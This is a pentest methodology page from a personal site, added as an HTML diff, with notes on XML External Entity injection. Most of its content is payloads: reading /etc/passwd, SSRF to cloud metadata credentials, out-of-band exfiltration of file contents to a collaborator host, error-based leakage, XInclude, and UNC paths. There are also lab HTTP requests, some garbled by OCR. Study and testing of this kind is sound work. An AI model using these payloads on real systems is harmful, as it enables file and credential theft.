@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="9c601cbb-f44a-4b71-a2eb-d22c90b094dc" class="page sans"><header><h1 class="page-title">XML External Entities Injection (XXE)</h1><p class="page-description"></p></header><div class="page-body"><ul id="0c6fff36-47d0-4ab6-a373-3c8f906a477b" class="bulleted-list"><li style="list-style-type:disc">Attacking systems that parse XML input</li></ul><ul id="725d3bd7-2996-480d-96a3-9d6b55dca6fd" class="bulleted-list"><li style="list-style-type:disc">Dos, LFI, RCE etc.</li></ul><ul id="fde60ac8-c63f-4ad6-99b3-fe4d4e577fed" class="bulleted-list"><li style="list-style-type:disc">XML basics</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ce93efdc-73b9-48d6-8a24-a17ed208608b" class="code"><code class="language-Bash">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISOBLAH&quot;
+&lt;!DOCTYPE gift [
+	&lt;!ENTITY from &quot;C:/File&amp;Stuff&quot;&gt;
+]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;Frank&lt;/To&gt;
+	&lt;From&gt;&amp;gift;&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><ul id="c1879d70-c474-4b2d-8f8a-a995c02ea54e" class="bulleted-list"><li style="list-style-type:disc">google XXE Payloads<ul id="f00c5a09-3357-4c5d-9535-77fd19a8116d" class="bulleted-list"><li style="list-style-type:circle">Payloads all the things</li></ul></li></ul><ul id="73daf752-9e6d-4b99-97a3-d26f55128cde" class="bulleted-list"><li style="list-style-type:disc">We can put malicious characters in our entities that are banned in normal use</li></ul><ul id="3b60ec3f-6ffc-4636-8791-1e52da8ffbf4" class="bulleted-list"><li style="list-style-type:disc">File upload features</li></ul><ul id="101d7e97-2966-44c5-86b3-a23744ba4cbd" class="bulleted-list"><li style="list-style-type:disc">Bypassing whitelisted extensions</li></ul><p id="35437130-0aec-44dd-881b-72cbc7f2efe9" class="">
+</p><p id="a95f7d63-857c-409d-8a8f-410f63f21d8a" class="">Detection:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="35e34abf-b058-4a84-8518-5a8c7ac76e3e" class="code"><code class="language-Java">- Attempt to send request as XML and see if it is accepted
+-- Can input be interpreted as XML? 
+- If file upload exists, Attempt to upload XML XXE file
+</code></pre><p id="9f3a7bfa-34ce-4e61-98e2-618a4d7ca1ba" class=""><strong>Prevention:</strong></p><h3 id="2fe1cff9-09b3-4024-8372-0380eede6729" class="">Disable XML External Entities</h3><p id="8168c846-bfc1-48ec-b9cf-f1ebd5eed12f" class="">This secure coding practice blocks <strong>XML External Entity attacks</strong></p><p id="1d67df55-e57c-4295-becf-16000bfe420b" class="">Unfortunately Java EE applications have a real problem with disabling XML External Entities. <br/>They are turned on by default in the default <br/>DocumentBuilder and all other XML related capabilities: schema verification, transformation, etc.</p><p id="7f7dc43e-c582-455c-af70-1dec6308c82d" class="">There is also a multitude of open source parsers which have different configuration settings for turning off entities. These parsers may be required by other open source components.</p><p id="4e57dbe4-eb33-48ff-9138-0dc5c89064eb" class="">
+</p><p id="9c772f50-b877-45cf-a557-54704fbf8c95" class="">
+</p><h2 id="27bb1aac-b825-4027-9e45-c4dd4b9d663d" class="">General Process:</h2><ul id="ab87ea2a-1b59-436d-8d7f-8249fcebba2c" class="bulleted-list"><li style="list-style-type:disc">Utilize well known files like /etc/passwd, /etc/hostname, win.ini to make life easier…</li></ul><ul id="dda8685c-dc34-4660-a9ea-fad33557cd28" class="bulleted-list"><li style="list-style-type:disc">Start with testing regular DTD<ul id="9bef4712-0ba7-4d12-aa23-09f9fdfce085" class="bulleted-list"><li style="list-style-type:circle">Try with file, FTP, SMB, regular collaborator web server to try and get pingback</li></ul></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="df7360e6-1ede-47a0-b50f-30e837b1b5b0" class="code"><code class="language-XML">&lt;!DOCTYPE test [
+&lt;!ENTITY % test SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;input&gt;&amp;test;&lt;/input&gt;</code></pre><ul id="9c86990c-970f-4766-abfd-e02afad1a0f8" class="bulleted-list"><li style="list-style-type:disc">Then move on to blind and parameter injection</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e9b7ebda-8009-4ea3-b75e-2672e0609d85" class="code"><code class="language-XML">#parameter
+&lt;!DOCTYPE test [
+&lt;!ENTITY % test SYSTEM &quot;https://&lt;hosted.dtd&gt;&quot;&gt; %test; ]&gt;
+&lt;input&gt;test&lt;/input&gt;</code></pre><ul id="e6c74a95-8b97-4f68-bd3c-d10162162278" class="bulleted-list"><li style="list-style-type:disc">Try OOB injection</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="86ede685-d0dc-4ca1-8148-642845840117" class="code"><code class="language-XML">#OOB
+&lt;!DOCTYPE test [
+&lt;!ENTITY % test SYSTEM &quot;http://&lt;COLLAB-Server&gt;&quot;&gt; %test; ]&gt;
+&lt;input&gt;test&lt;/input&gt;</code></pre><ul id="2fa864b9-6779-44fa-b886-204b5c53a250" class="bulleted-list"><li style="list-style-type:disc">Test for XInclude (as well as OOB)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="08597ceb-a39d-45fb-93dc-b93d5a240a7d" class="code"><code class="language-XML">&lt;input xmlns:xi=&quot;http://www.w2.org/2001/XInclude&quot;&gt;
+&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/hostname&quot;/&gt;
+&lt;/input&gt;</code></pre><p id="3fc8d48f-2a60-4ab7-83aa-48bc9a2ad714" class="">
+</p><p id="76478f90-3ec2-40a6-b71c-e6367e7c56f3" class=""><strong>Examples</strong>:</p><p id="892b8677-aa46-4c27-9b17-9b442338d531" class=""><strong>Basic in-band:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c90c1809-a526-40ba-b7f0-ac6bb1d132fe" class="code"><code class="language-PHP">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;&amp;test;&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="d26c46e7-650f-40bf-80bc-53973254d7e0" class="">
+</p><p id="2fc64b7d-c813-4771-87d8-89b930571bb1" class=""><strong>XXE to SSRF:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8bc05ba6-9d13-4bc4-82cf-95f661ba9bf8" class="code"><code class="language-PHP">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY test SYSTEM &quot;http://0.0.0.0/latest/meta-data/iam/security-credentials/admin&quot;&gt;
+]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;&amp;test;&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt;</code></pre><p id="60a7d33f-a7c8-4a65-916c-cc30c4e34daf" class="">
+</p><p id="21535153-0ebd-4959-9fb0-49a7f407669f" class=""><strong>Blind XXE Out-of-Band:</strong></p><ul id="7649fd01-c8eb-42e8-b281-5b854ae2b84e" class="bulleted-list"><li style="list-style-type:disc">response returns an error instead of reflecting information back.</li></ul><ul id="b3e255b2-69af-4761-87bc-2a07c6cac40d" class="bulleted-list"><li style="list-style-type:disc">Burp collaborator servers can capture the OOB interaction for us…</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fab2d9d0-813a-4882-afae-ae277a3f5e85" class="code"><code class="language-PHP">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY test SYSTEM &quot;http://0.0.0.0/&quot;&gt;
+]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;&amp;test;&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="90117514-9fe5-4364-b0e2-2de3f78f61be" class="">
+</p><p id="6f895617-afed-493e-b9b7-a8db3f082fab" class=""><strong>Parameter Entities:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d10e5c96-fbdf-4404-8a01-10cf7b31abee" class="code"><code class="language-PHP">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY % test SYSTEM &quot;http://0.0.0.0/&quot;&gt; %test;]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;test&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="e42b547d-5433-4b23-9b0d-ef791fe3ece9" class="">
+</p><p id="cafd1bac-0845-4f9c-bdc4-e8e72a3b768d" class="">Out-Of-Band Data exfiltration:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e151f52-e748-44db-a0ec-e865e9380b2c" class="code"><code class="language-PHP">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY % loadDtd SYSTEM &quot;http://0.0.0.0/exploit-server&quot;&gt; 
+%loadDtd;
+%stack;
+%exfil]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;test&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="40b64fed-a736-4435-9c17-133ecae59124" class="">Exploit file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f904b720-bde2-4e45-ac89-29053b7b6120" class="code"><code class="language-PHP">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;
+&lt;!ENTITY % stack &quot;&lt;!ENTITY % exfil SYSTEM &#x27;http://collaborator-server/%file;&#x27;&gt;&quot;&gt;
+-----OR-----
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;
+&lt;!ENTITY % stack &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://collaborator-server/%file;&#x27;&gt;&quot;&gt;</code></pre><p id="6d89ad5f-3318-4da6-ae95-15c4ef3e95e8" class="">
+</p><p id="0977bf9e-333c-447f-8201-7a843373f3c7" class=""><strong>Retrieving data via errors:</strong></p><ul id="2b32b27f-c8c5-4558-9562-3f8b0d1ff603" class="bulleted-list"><li style="list-style-type:disc">We can trigger an error in the XML parser and append some useful information to the end of the error response!</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2ffcb418-e10c-45f3-a703-83b5429397a1" class="code"><code class="language-PHP">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY % loadDtd SYSTEM &quot;http://0.0.0.0/exploit-server&quot;&gt; 
+%loadDtd;
+%stack;
+%exfil]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;test&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="42ee60a8-4c4a-461a-96b1-325fcad8d5e7" class="">Exploit file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="98583d57-8bb2-4601-810b-723e15f5832d" class="code"><code class="language-PHP">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % stack &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file://non-existent-file/%file;&#x27;&gt;&quot;&gt;</code></pre><p id="2e08f93b-1c4a-49f1-900b-9cda82954542" class="">
+</p><p id="d94fd8e1-b8a6-4c3e-a542-ff52f2592d30" class=""><strong>Xinclude:</strong></p><ul id="4b67033c-8aef-47a6-80cc-b2e09c79578b" class="bulleted-list"><li style="list-style-type:disc">if we are given JSON, its worth a try to convert to XML in burp and see if it accepts it.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cfdf0486-edef-422d-af13-e78664eac084" class="code"><code class="language-PHP">POST /product/stock HTTP/1.1
+Host:
+ac731f6615667ffc084703400a0004d .web-securit y-academy. net
+Cookie: session=
+(VCO4RvW6 JF6b0P2Lcn8tDMNGWXBOyb iD
+User-Agent: Mozilla/5.0 (X11; Linux ×86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept:
+* /*
+Content - Type:
+application/x-www-form-urlencoded
+Origin:
+I
+https://ac731f6615667ffc084703400a0004d.web
+-security-academy. net
+Content -Length: 128
+Te: trailers
+Connection: close
+productId=%26entity;&amp;storeId=1</code></pre><p id="91ecda1a-795a-4d79-b393-7036bf4c29c9" class="">Convert to XML And try XXE</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="af8e26f1-57cb-4bc9-94b6-e2c8bfb16e6b" class="code"><code class="language-PHP">POST /product/stock HTTP/1.1
+Host:
+ac731f6615667ffc084703400a0004d .web-securit y-academy. net
+Cookie: session=
+(VCO4RvW6 JF6b0P2Lcn8tDMNGWXBOyb iD
+User-Agent: Mozilla/5.0 (X11; Linux ×86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept:
+* /*
+Content - Type:
+application/x-www-form-urlencoded
+Origin:
+I
+https://ac731f6615667ffc084703400a0004d.web
+-security-academy. net
+Content -Length: 128
+Te: trailers
+Connection: close
+productId=&lt;hack xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt; xi:include parse=&quot;text&quot;
+href-&quot;file:///etc/passwd&quot;/&gt;&lt;/hack&gt;&amp;storeId=1</code></pre><p id="8e909027-6da7-4a55-8763-9be3076daafd" class="">
+</p><p id="0e09f417-1027-4ee0-9ed4-542754e08e3a" class=""><strong>Repurposing local Dtds for data exfiltration:</strong></p><ul id="1c2f88b0-a488-40b9-8f44-666f3a53c51e" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder</a></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ff51e87d-ae40-4941-be13-1dedc5f88cd6" class="code"><code class="language-PHP"></code></pre><p id="d337f9a7-1769-4c0f-b6d2-af1ae1413681" class="">
+</p><p id="fc2b00b7-bff8-415b-8142-84e2344dfa83" class=""><strong>XXE via SVG image:</strong></p><ul id="ce566fce-f6e3-445f-8d65-3f0a86b4f770" class="bulleted-list"><li style="list-style-type:disc">exploit file uploads since svg is just an xml image</li></ul><ul id="73fcff7c-3829-4491-87c4-e7dbcea4b66a" class="bulleted-list"><li style="list-style-type:disc">Replace the requests image xml with your xml then send it</li></ul><p id="1673aa5e-0396-4e65-8fe6-8c9becfab482" class="">
+</p><p id="9a228f34-d694-4b42-bda9-89a120bdac6d" class=""><strong>XXE Chained with UNC path exploitation:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d70bf38d-2209-4939-bde1-ae724245d7db" class="code"><code class="language-Python">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:////0.0.0.0/test.txt&quot; &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p id="e844eaf0-575d-4114-983b-5e7ca31dd72d" class="">
+</p><p id="ce105267-ebfc-4231-b27f-fd5706f83de7" class="">
